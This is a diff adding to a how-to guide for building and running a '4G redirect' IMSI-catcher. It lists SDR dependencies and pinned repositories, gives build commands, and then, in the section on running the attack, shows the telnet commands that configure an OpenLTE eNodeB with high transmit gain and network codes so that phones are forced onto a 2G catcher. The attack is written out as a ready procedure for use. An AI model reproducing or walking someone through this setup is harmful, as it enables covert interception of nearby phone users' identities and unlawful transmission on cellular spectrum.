@@ -22,12 +22,59 @@ apt upgrade
 
 apt install build-essential libgmp-dev libx11-6 libx11-dev flex libncurses5 libncurses5-dev libncursesw6 libpcsclite-dev zlib1g-dev libmpfr6 libmpc3 lemon aptitude libtinfo-dev libtool shtool autoconf git-core pkg-config make libmpfr-dev libmpc-dev libtalloc-dev libfftw3-dev libgnutls28-dev libssl1.0-dev libtool-bin libxml2-dev sofia-sip-bin libsofia-sip-ua-dev sofia-sip-bin libncursesw5-dev bison libgmp3-dev alsa-oss asn1c libdbd-sqlite3 libboost-all-dev libusb-1.0-0-dev python-mako python3-mako doxygen python-docutils cmake build-essential g++ libpython-dev python-numpy python3-numpy swig libsqlite3-dev libi2c-dev libwxgtk3.0-gtk3-dev freeglut3-dev composer phpunit python3-pip python-pip
 
-pip install request
-pip3 install request
+pip install requests
+pip3 install requests
 
 4G Redirect
 
 Clone or download the necessary repositories :
 
 git clone https://github.com/ettusresearch/uhd tested with checkout dbaf4132f
-git clone https://github.com/pothosware/SoapySDR tested with c
+git clone https://github.com/pothosware/SoapySDR tested with checkout 67abec9
+git clone https://github.com/nuand/BladeRF (necessary even if you don’t have a blade) tested with checkout f03d8433
+git clone https://github.com/pothosware/SoapyBladeRF (only if you have a BladeRF) tested with checkout 1c1e8aa
+git clone https://github.com/pothosware/SoapyUHD tested with checkout 7371e68
+git clone https://github.com/myriadrf/LimeSuite only if you have a LimeSDR) tested with checkout a5b3a10f
+git clone https://github.com/gnuradio/gnuradio tested with checkout 8e2808513
+git clone https://github.com/osmocmo/gr-osmosdr tested with checkout 4d83c60
+wget https://tls.mbed.org/download/polarssl-1.3.7-gpl.tgz && tar zxvf polarssl-1.3.7-gpl.tgz
+git clone https://github.com/bbaranoff/openlte tested with checkout 4bd673b
+
+Compilation (same order for the compilation than from the git clone(s) or download)
+cd dir_to_compile
+(git submodule init && git submodule update) -> only for gnuradio
+(cd host) -> only for uhd
+
+mkdir build
+cd build
+cmake ..
+make -j$nproc
+make install
+ldconfig
+
+Then build 2G IMSI-Catcher
+Build IMSI-catcher
+
+Running
+Phone in 2G/3G/4G mode
+This article is in progress and is just a PoC
+The attack step are run the IMSI-catcher into arfcn 514 follow (see Build IMSI-catcher)
+run the 4G redirector as follow
+
+Shell #1
+LTE_fdd_enodeb
+
+Shell #2
+telnet localhost 30000
+write rx_gain 30
+write tx_gain 80
+write mcc 215
+write mnc 15
+write band 7
+write dl_earfcn 3350
+(change with your ue values be careful that the earfcn is in the band)
+
+Then switch the phone in airplane mode and in localhost:30000 (Shell #2)
+start
+
+wait… and when you have “ok” answer in shell #2 remove airplane mode and … enjoy !
